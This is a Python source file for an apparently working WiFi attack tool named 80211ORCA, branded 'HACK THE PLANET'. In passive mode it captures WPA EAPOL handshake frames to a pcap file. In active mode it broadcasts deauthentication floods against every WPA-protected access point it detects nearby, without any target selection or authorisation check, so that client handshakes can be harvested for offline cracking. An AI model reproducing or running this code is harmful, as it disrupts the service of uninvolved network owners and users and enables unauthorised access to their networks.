"""
        !!HACK THE PLANET!!
80211ORCA.PY
github.com/n0nexist
Automatic Passive/Active WiFi handshake sniffer.
        !!HACK THE PLANET!!
"""

import os
import psutil
from rich.prompt import Prompt
from threading import Thread, Lock
import time
from datetime import datetime
from scapy.all import *
from scapy.layers.eap import EAPOL_KEY

os.system("clear")
print("""\033[35m
⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠺⢿⣿⣿⣿⣿⣿⣿⣷⣦⣠⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿\033[31mHACK\033[34m⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣷⣄⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⠀⠀⠀⣀⣿⣿⣿⣆⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⠀⠀⠀⣾⣿⣿⡿⠋⠁⣀⣠⣬⣽⣿⣿\033[31mTHE\033[34m⣿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠁
⠀⠀⠀⢀⣿⣿⡏⢀⣴⣿⠿⠛⠉⠉⠀⢸⣿⣿⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⢠⣾⡟⠁⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣸⣿⣿⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣾⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣾\033[31mPLANET\033[34m⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣿⡿⠛⠉⠀⠀⠀⠈⠙⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[0m""")

from rich import print


if os.getuid() != 0:
    print("\033[31m[-] NEED ROOT.\033[0m")
    exit(1)


def getPCAPfilename():
    d = datetime.now()
    return f"{d.day}_{d.month}_{d.year}__{d.hour}-{d.minute}.pcap"


def getTimestamp():
    d = datetime.now()
    return f"[{d.hour}:{d.minute}:{d.second}:{d.microsecond // 1000}]"


PCAP = getPCAPfilename()
MODE = "passive"
CHANNEL = 6
TARGETLIST = []
TARGET_LOCK = Lock()
INTERFACE = ""
PCAPWRITER = PcapWriter(PCAP, append=True, sync=True)
PRINT_SEPARATOR = " "*35
HANDSHAKE_FRAG_COUNTER = 0

def alreadySeen(s):
    with TARGET_LOCK:
        for item in TARGETLIST:
            if item[0] == s:
                return True
        return False

""" PASSIVE HANDSHAKE SNIFFING """
def get_eapol_message_number(pkt):
    if EAPOL not in pkt:
        return None
    eapol = pkt[EAPOL]
    if eapol.type != 3:
        return None
    if not eapol.haslayer(EAPOL_KEY):
        return None
    key = eapol[EAPOL_KEY]
    ack = key.key_ack
    mic = key.key_mic
    install = key.install
    secure = key.secure

    if ack == 1 and mic == 0:
        return "1"
    if ack == 0 and mic == 1:
        return "2"
    if ack == 1 and mic == 1 and install == 1:
        return "[green]3[/green]"
    if ack == 1 and mic == 1 and secure == 1:
        return "4"
    return None

def is_deauth(pkt):
    if pkt.haslayer(Dot11):
        return pkt[Dot11].type == 0 and pkt[Dot11].subtype == 12
    return False

def handshake_sniffer(pkt):
    global HANDSHAKE_FRAG_COUNTER
    if is_deauth(pkt):
        return
    PCAPWRITER.write(pkt)
    if EAPOL in pkt:
        HANDSHAKE_FRAG_COUNTER += 1
        msg = get_eapol_message_number(pkt)
        msg_label = f"{msg} of 4" if msg else "unknown"
        print(f"[bright_black]+{HANDSHAKE_FRAG_COUNTER}[/bright_black] Captured [green]handshake[/green] fragment, {msg_label}.{PRINT_SEPARATOR}")

def intercept_handshakes():
    global INTERFACE
    sniff(prn=handshake_sniffer, iface=INTERFACE, monitor=True, store=False)
""" END PASSIVE HANDSHAKE SNIFFING """


""" ACTIVE ATTACK """
def deauthenticate_wifi_network(target_mac):
    global INTERFACE
    pkt = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_mac, addr3=target_mac) / Dot11Deauth()

    for x in range(100):
        print(f"[bright_black]{getTimestamp()} Shooting laser beam at [red]{target_mac}[/red]...[/bright_black]{PRINT_SEPARATOR}", end="\r")
        sendp(pkt, iface=INTERFACE, verbose=0)

def active_deauth_attack(pkt):
    if pkt.haslayer(Dot11Beacon):
        wifi_mac = pkt.addr2
        if not alreadySeen(wifi_mac):
            with TARGET_LOCK:
                TARGETLIST.append((wifi_mac, time.time()))
            wifi_name = pkt.info.decode()
            try:
                netstats = pkt[Dot11Beacon].network_stats()
                enctype  = str('/'.join(netstats['crypto']))
            except:
                enctype = "unknown"
            rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "unknown"
            wifiFullInfo = f"'{wifi_name}' ({wifi_mac})"

            if enctype == "OPN" or enctype == "WEP" or enctype == "unknown" or "SAE" in enctype:
                print(f"[bright_black]{getTimestamp()} Skipping [yellow]{wifiFullInfo}[/yellow]...[/bright_black]{PRINT_SEPARATOR}", end="\r")
            else:
                Thread(target=deauthenticate_wifi_network, args=(wifi_mac,), daemon=True).start()

def active_combined_handler(pkt):
    handshake_sniffer(pkt)
    active_deauth_attack(pkt)

def active_attack_cleanup_thread():
    while True:
        now = time.time()
        with TARGET_LOCK:
            TARGETLIST[:] = [(s, ts) for s, ts in TARGETLIST if now - ts < 10]
        time.sleep(1)

def active_attack():
    sniff(prn=active_combined_handler, iface=INTERFACE, monitor=True, store=False)
""" END ACTIVE ATTACK """


""" PRINT SETTINGS """
def printCurrentSettings():
    global MODE, CHANNEL
    modestring = f"[red]{MODE}[/red]"

    if MODE == "passive":
        modestring = f"[green]{MODE}[/green]"

    print(f"\n\n[bright_black]**[/bright_black] Starting {modestring} attack.")
    print(f"[bright_black]**[/bright_black] Listening for packets on channel [cyan]{CHANNEL}[/cyan].")
    print(f"[bright_black]**[/bright_black] Saving captures on file: \"{PCAP}\"")
""" END PRINT SETTINGS """


""" MAIN FUNCTION """
def main():
    global MODE, CHANNEL, INTERFACE

    addrs = list(psutil.net_if_addrs())

    INTERFACE = Prompt.ask("Select an [bold][cyan]interface[/cyan][/bold]",choices=addrs,default=addrs[-1])
    CHANNEL = Prompt.ask("Select a [bold][cyan]channel[/cyan][/bold]",choices=[str(i) for i in range(1, 14)],default="6")
    CHANNEL = int(CHANNEL)
    MODE = Prompt.ask("[red]Attack[/red] mode",choices=["active","passive"],default="passive")
    os.popen(f"iwconfig {INTERFACE} channel {CHANNEL}").read()

    printCurrentSettings()

    if MODE == "passive":
        Thread(target=intercept_handshakes).start()

    if MODE == "active":
        Thread(target=active_attack).start()
        Thread(target=active_attack_cleanup_thread, daemon=True).start()
""" END MAIN FUNCTION """


try:
    main()
except KeyboardInterrupt:
    print("\n\n[red](CTRL-C)[/red] Exiting...\n")
